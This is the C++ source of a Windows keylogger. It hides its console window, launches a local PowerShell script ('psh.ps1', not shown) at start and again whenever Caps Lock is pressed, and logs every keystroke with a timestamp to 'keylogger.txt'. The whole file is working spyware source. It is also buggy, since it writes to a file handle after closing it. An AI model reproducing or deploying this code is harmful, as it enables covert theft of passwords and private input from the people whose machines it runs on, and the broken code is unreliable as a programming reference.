﻿#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>
#include <time.h>
#include <cstdlib>
#include <io.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <direct.h>
#include <string>
#define FILE_NAME "keylogger.txt"
using namespace std;

void log(); //keylogger
void path(); //powershell
void hide(); //hide window

int main()
{
	hide();
	path();
	log();
	return 0;
}


void path()
{
	string strPath = "psh.ps1";
	if (_access(strPath.c_str(), 0) == 0)
	{
		system("start powershell.exe -File psh.ps1"); //start
		system("cls");
	}
	else
	{
		system("cls");
		system("pause");
	}
}

void log()
{
	FILE* file = fopen(FILE_NAME, "a");
	time_t date = time(NULL); //date
	fprintf(file, "\n%s\t", ctime(&date)); //print the date
	fclose(file);
	char key;
	for (;;) //infinite loop
	{
		for (key = 8; key <= 222; key++) //the range obtained from ASCII codes
		{
			if (GetAsyncKeyState(key) == -32767) //any key interruptions
			{
				ofstream write("keylogger.txt", ios::app); //exclude re-writing of the file

				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) //lower letter case because shift is not pressed
				{
					key += 32;
					write << key;
					write.close();
					break;
				}
				else if ((key > 64) && (key < 91)) //shift is pressed
				{
					write << key;
					write.close();
					break;
				}
				else if (GetAsyncKeyState(0x10)) //shift with numbers and other
				{
					switch (key)
					{
					case 0x30:
						fputs(")", file);
						break;
					case 0x31:
						fputs("!", file);
						break;
					case 0x32:
						fputs("@", file);
						break;
					case 0x33:
						fputs("#", file);
						break;
					case 0x34:
						fputs("$", file);
						break;
					case 0x35:
						fputs("%", file);
						break;
					case 0x36:
						fputs("^", file);
						break;
					case 0x37:
						fputs("&", file);
						break;
					case 0x38:
						fputs("*", file);
						break;
					case 0x39:
						fputs("(", file);
						break;
					case 0xBF:
						fputs("?", file);
						break;
					case 0xBB:
						fputs("+", file);
						break;
					case 0xBE:
						fputs("<", file);
						break;
					case 0xBD:
						fputs("_", file);
						break;
					case 0xE2:
						fputs(">", file);
						break;
					case 0x1C:
						fputs("[VK_CONVERT]", file);
						break;
					case 0x56:
						fputs("@", file);
						break;
					case  0x2A:
						fputs("[PRINT]", file);
						break;
					case  0x2E:
						fputs("[Delete]", file);
						break;
					case 0xAA:
						fputs("[Search]", file);
						break;
					case  0xF2:
						fputs("[Copy]", file);
						break;
					case 0xFE:
						fputs("[Clear]", file);
						break;
					case  0x3:
						fputs("[Connect]", file);
						break;
					case 0x6:
						fputs("[Logoff]", file);
						break;
					}
				}
				else //without shift
				{
					switch (key)
					{
					case 0x30:
						fputs("0", file);
						break;
					case 0x31:
						fputs("1", file);
						break;
					case 0x32:
						fputs("2", file);
						break;
					case 0x33:
						fputs("3", file);
						break;
					case 0x34:
						fputs("4", file);
						break;
					case 0x35:
						fputs("5", file);
						break;
					case 0x36:
						fputs("6", file);
						break;
					case 0x37:
						fputs("7", file);
						break;
					case 0x38:
						fputs("8", file);
						break;
					case 0x39:
						fputs("9", file);
						break;
					case 0xBF:
						fputs("/", file);
						break;
					case 0xBB:
						fputs("=", file);
						break;
					case 0xBC:
						fputs(",", file);
						break;
					case VK_OEM_PERIOD:
						fputs(".", file);
						break;
					case 0xBD:
						fputs("-", file);
						break;
					case 0xE2:
						fputs("<", file);
						break;
					}
				}
				if (!(GetAsyncKeyState(VK_SHIFT))) //lower letter case with special 
					//ps it's for fun it doesn't come here
				{
					switch (key)
					{
					case 0x41:
						fputs("a", file);
						break;
					case 0x42:
						fputs("b", file);
						break;
					case 0x43:
						fputs("c", file);
						break;
					case 0xBA:
						fputs("č", file);
						break;
					case 0x44:
						fputs("d", file);
						break;
					case 0x45:
						fputs("e", file);
						break;
					case 0x46:
						fputs("f", file);
						break;
					case 0x47:
						fputs("g", file);
						break;
					case 0x48:
						fputs("h", file);
						break;
					case 0x49:
						fputs("i", file);
						break;
					case 0x4A:
						fputs("j", file);
						break;
					case 0x4B:
						fputs("k", file);
						break;
					case 0x4C:
						fputs("l", file);
						break;
					case 0x4D:
						fputs("m", file);
						break;
					case 0x4E:
						fputs("n", file);
						break;
					case 0x4F:
						fputs("o", file);
						break;
					case 0x50:
						fputs("p", file);
						break;
					case 0x52:
						fputs("r", file);
						break;
					case 0x53:
						fputs("s", file);
						break;
					case 0x54:
						fputs("t", file);
						break;
					case 0x55:
						fputs("u", file);
						break;
					case 0x56:
						fputs("v", file);
						break;
					case 0x5A:
						fputs("z", file);
						break;
					case 0xDC:
						fputs("\\", file);
						break;
					case 0x51:
						fputs("q", file);
						break;
					case 0x57:
						fputs("w", file);
						break;
					case 0x59:
						fputs("y", file);
						break;
					case 0x58:
						fputs("x", file);
						break;
					case 0xDE:
						fputs("ć", file);
						break;
					case 0xDD:
						fputs("đ", file);
						break;
					default:
						fputs(" ", file);
					}
				}
				if ((GetAsyncKeyState(VK_SHIFT)))
				{
					switch (key)
					{
					case 0x41:
						fputs("A", file);
						break;
					case 0x42:
						fputs("B", file);
						break;
					case 0x43:
						fputs("C", file);
						break;
					case 0xBA:
						fputs("č", file);
						break;
					case 0x44:
						fputs("D", file);
						break;
					case 0x45:
						fputs("E", file);
						break;
					case 0x46:
						fputs("F", file);
						break;
					case 0x47:
						fputs("G", file);
						break;
					case 0x48:
						fputs("H", file);
						break;
					case 0x49:
						fputs("I", file);
						break;
					case 0x4A:
						fputs("J", file);
						break;
					case 0x4B:
						fputs("K", file);
						break;
					case 0x4C:
						fputs("L", file);
						break;
					case 0x4D:
						fputs("M", file);
						break;
					case 0x4E:
						fputs("N", file);
						break;
					case 0x4F:
						fputs("O", file);
						break;
					case 0x50:
						fputs("P", file);
						break;
					case 0x52:
						fputs("R", file);
						break;
					case 0x53:
						fputs("S", file);
						break;
					case 0x54:
						fputs("T", file);
						break;
					case 0x55:
						fputs("U", file);
						break;
					case 0x56:
						fputs("V", file);
						break;
					case 0x5A:
						fputs("Z", file);
						break;
					case 0x51:
						fputs("Q", file);
						break;
					case 0x57:
						fputs("W", file);
						break;
					case 0x59:
						fputs("Y", file);
						break;
					case 0x58:
						fputs("X", file);
						break;
					default:
						fputs(" ", file);
					}
				}
				else VK_SHIFT + KF_ALTDOWN;
				switch (key) //other
				{
				case VK_SPACE:
					fputs("[Space]", file);
					break;
				case 0x2E:
					fputs("[Delete]", file);
					break;
				case VK_BACK:
					fputs("[BackSpace]", file);
					break;
				case VK_RETURN:
					fputs("[Enter]\n", file);
					break;
				case VK_CONTROL:
					fputs("[Ctrl]", file);
					break;
				case VK_TAB:
					fputs("[Tab]", file);
					break;
				case 0x25:
					fputs("[Left Arrow]", file);
					break;
				case 0x26:
					fputs("[Up Arrow]", file);
					break;
				case 0x27:
					fputs("[Right Arrow]", file);
					break;
				case 0x28:
					fputs("[Down Arrow]", file);
					break;
				case VK_ESCAPE:
					fputs("[Esc]", file);
					break;
				case VK_CAPITAL:
					fputs("[Caps Lock]", file);
					path();
					break;
				case VK_RSHIFT:
					fputs("[Right Shift]", file);
					break;
				case VK_LSHIFT:
					fputs("[Left Shift]", file);
					break;
				case VK_LMENU:
					fputs("[Left Alt]", file);
					break;
				case VK_RMENU:
					fputs("[Right Alt]", file);
					break;
				case VK_LWIN:
					fputs("[Left Win]", file);
					break;
				case VK_RWIN:
					fputs("[Right Win]", file);
					break;
				case VK_INSERT:
					fputs("[Insert]", file);
					break;
				case VK_SCROLL:
					fputs("[Scroll Lock]", file);
					break;
				case VK_HOME:
					fputs("[Home]", file);
					break;
				case VK_END:
					fputs("[End]", file);
					break;
				case VK_PRIOR:
					fputs("[Page Up]", file);
					break;
				case VK_NEXT:
					fputs("[Page Down]", file);
					break;
				case VK_SNAPSHOT:
					fputs("[Print Screen]", file);
					break;
				case VK_OEM_3:
					fputs("[ ~ ` ]", file);
					break;
				case VK_OEM_4:
					fputs("[ { [ ]", file);
					break;
				case VK_OEM_6:
					fputs("[ } ] ]", file);
					break;
				case VK_OEM_1:
					fputs("[ : ; ]", file);
					break;
				case VK_OEM_7:
					fputs("[ \" ' ]", file);
					break;
				case VK_F1:
					fputs("[F1]", file);
					break;
				case VK_F2:
					fputs("[F2]", file);
					break;
				case VK_F3:
					fputs("[F3]", file);
					break;
				case VK_F4:
					fputs("[F4]", file);
					break;
				case VK_F5:
					fputs("[F5]", file);
					break;
				case VK_F6:
					fputs("[F6]", file);
					break;
				case VK_F7:
					fputs("[F7]", file);
					break;
				case VK_F8:
					fputs("[F8]", file);
					break;
				case VK_F9:
					fputs("[F9]", file);
					break;
				case VK_F10:
					fputs("[F10]", file);
					break;
				case VK_F11:
					fputs("[F11]", file);
					break;
				case VK_F12:
					fputs("[F12]", file);
					break;
				case VK_NUMPAD0:	//numpad
					fputs("0", file);
					break;
				case VK_NUMPAD1:
					fputs("1", file);
					break;
				case VK_NUMPAD2:
					fputs("2", file);
					break;
				case VK_NUMPAD3:
					fputs("3", file);
					break;
				case VK_NUMPAD4:
					fputs("4", file);
					break;
				case VK_NUMPAD5:
					fputs("5", file);
					break;
				case VK_NUMPAD6:
					fputs("6", file);
					break;
				case VK_NUMPAD7:
					fputs("7", file);
					break;
				case VK_NUMPAD8:
					fputs("8", file);
					break;
				case VK_NUMPAD9:
					fputs("9", file);
					break;
				case 0x6F:
					fputs("[/]", file);
					break;
				case 0x6A:
					fputs("[*]", file);
					break;
				case 0x6D:
					fputs("[-]", file);
					break;
				case 0x6B:
					fputs("[+]", file);
					break;
				case 0x6E:
					fputs("[,]", file);
					break;
				}
			}
		}
	}
}

void hide()
{
	HWND stealth; //created to handle the input generated by FindWindowA function
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0); //0 inplying that it shouldn't display on the home screen
}
